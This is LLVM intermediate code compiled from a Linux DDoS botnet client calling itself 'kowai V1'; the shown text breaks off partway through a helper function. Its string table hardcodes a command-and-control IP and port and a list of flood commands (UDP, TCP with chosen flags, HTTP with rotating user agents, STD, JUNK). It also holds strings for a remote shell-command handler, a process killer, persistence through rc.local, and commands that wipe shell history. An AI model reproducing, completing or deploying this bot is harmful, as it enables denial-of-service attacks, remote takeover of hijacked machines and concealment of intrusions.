; ModuleID = 'host/ir_O2/Kowai.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.state_t = type { i32, i8 }
%struct.__dirstream = type opaque
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@cncip = local_unnamed_addr global i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [16 x i8] c"178.128.154.119\00", align 1
@cncport = local_unnamed_addr global i32 1994, align 4
@useragents = local_unnamed_addr global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.32, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.3 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.4 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.6 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.7 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.8 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.10 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.11 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.12 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.13 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.14 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.17 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.18 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.19 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.21 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.22 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.23 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.24 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.25 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.26 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.27 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.28 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.29 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.30 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.32 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@rangechoice = local_unnamed_addr global i32 1, align 4
@hacked = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@pgid = common local_unnamed_addr global i32 0, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@ourPublicIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.147 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.33 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.34 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.36 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.73 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.74 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.76 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.77 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.80 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.82 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.83 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.84 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.87, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0)], align 16
@.str.91 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.92 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.93 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.94 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.87 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.96 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.97 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.98 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.99 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.102 = private unnamed_addr constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [30 x i8] c"Successfully downloaded file\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.110 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.111 = private unnamed_addr constant [7 x i8] c"KILLER\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.113 = private unnamed_addr constant [15 x i8] c"KILLER STOPPED\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.115 = private unnamed_addr constant [15 x i8] c"KILLER STARTED\00", align 1
@.str.116 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.117 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.118 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.122 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.124 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"STOPATTK\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.129 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.131 = private unnamed_addr constant [33 x i8] c"kowai ohhhh that sad kid slump??\00", align 1
@.str.132 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.134 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.135 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.136 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.137 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.139 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.140 = private unnamed_addr constant [52 x i8] c"\1B[1;35mJoining\1B[1;32m > \1B[90m[\1B[1;33m%s\1B[90m]  \1B[0m\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"kowai V1\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.143 = private unnamed_addr constant [4 x i8] c"CMD\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.145 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.146 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #16
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #16
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
